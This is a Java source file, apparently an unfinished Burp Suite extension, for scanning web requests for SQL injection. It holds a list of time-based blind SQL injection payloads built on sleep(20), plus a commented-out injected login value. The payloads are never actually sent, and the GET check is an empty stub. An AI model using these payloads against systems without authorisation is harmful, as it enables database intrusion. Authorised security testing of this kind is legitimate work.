package sqlinject;

import java.util.List;

import org.apache.http.Header;
import org.omg.CORBA.PUBLIC_MEMBER;

import bsmali4.Bsmali4Post;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;

public class CopyOfSQLINJECT {
	static List<String> payloads;
	static String cookies;

	// 初始化payloads
	public static List<String> initpayload(boolean refresh) {
		if (refresh) {
			payloads = null;
		}
		if (payloads != null)
			return payloads;
		else {
			payloads = new ArrayList<String>();
			payloads.add("' and sleep(20)");
			payloads.add("' xor sleep(20)");
			payloads.add("' or sleep(20)");
			payloads.add("' and sleep(20)#");
			payloads.add("' xor sleep(20)#");
			payloads.add("' or sleep(20)#");
			payloads.add("' and sleep(20)--");
			payloads.add("' xor sleep(20)--");
			payloads.add("' or sleep(20)--");
			payloads.add("') and sleep(20) or ('a'='a");
			payloads.add("') xor sleep(20) or ('a'='a");
			payloads.add("') and sleep(20) or ('a'='a");
			payloads.add("^sleep(20)^'");
			payloads.add("'^sleep(20)^'");
			payloads.add("^sleep(20)#");
			payloads.add("'^sleep(20)#");
			payloads.add("'^sleep(20)--");
			payloads.add("^sleep(20)--");
			payloads.add("' or sleep(20) or '1'='1'--");
			payloads.add("' and sleep(20) or '1'='1'--");
			payloads.add("' xor sleep(20) or '1'='1'--");
			payloads.add("' or sleep(20) or ''='");
			payloads.add("\" or sleep(20) or \"\"=\"");
			payloads.add("\" sleep(20) or \"a\"=\"a");
			payloads.add("\" and sleep(20) or 1=1 --");
			payloads.add("' and sleep(20) or 1=1 --");
			payloads.add("' and sleep(20) or 'a'='a");
			payloads.add("') or sleep(20) or ('a'='a");
			payloads.add("\") or sleep(20) or (\"a\"=\"a");
			payloads.add("'admin' or sleep(20) or 'x'='x';");
			return payloads;
		}
	}

	public static void checkPostSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		// 发送post包
		/*
		 * for (int i = 0; i < parameters.size(); i++) { IParameter parameter =
		 * parameters.get(i); stdout.println(parameter.getName() + ":" +
		 * parameter.getValue()); }
		 */
		long startTime = System.currentTimeMillis();
		final Bsmali4Post httpPost = new Bsmali4Post(url.toString());
		//HEADER
		for (String header : headerStrings) {
			if (header.contains(":")) {
				String[] headerArrayStrings = header.split(":");
				if (headerArrayStrings[0].trim().equals("User-Agent")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals("Accept")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals(
						"Accept-Language")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals(
						"Accept-Encoding")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals("Cookie")) {
					cookies = headerArrayStrings[1];
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				}
			}
		}
		// 参数
		for (IParameter parameter : parameters) {
			if (!cookies.contains(parameter.getName())) {
				stdout.println(parameter.getName() + ":" + parameter.getValue());
				httpPost.addData(parameter.getName(), parameter.getValue());
			}
		}
		stdout.println("233331");
		Thread t1 = new Thread() {
			public void run() {
				httpPost.doPost();
			};
		};
		t1.start();
		try {
			t1.join();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		stdout.println(httpPost.getResContent());
		stdout.println("23333");
		/*
		 * httpPost.addHeader("Accept-Encoding", "identity");
		 * httpPost.addData("username", "admin' xor sleep(1)#");
		 * httpPost.addData("password", "x"); httpPost.addData("debug", "1");
		 * httpPost.doPost(); System.out.println(httpPost.getResStatus());
		 * System.out.println(httpPost.getResLen());
		 * System.out.println(httpPost.getResContent()); for (Header header :
		 * httpPost.getResHeaders()) { System.out.println(header.getName() + ":"
		 * + header.getValue()); } long endTime=System.currentTimeMillis();
		 * System.out.println((endTime - startTime));
		 */

	}

	public static void checkGetSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		/* 发送get包 */

	}
}
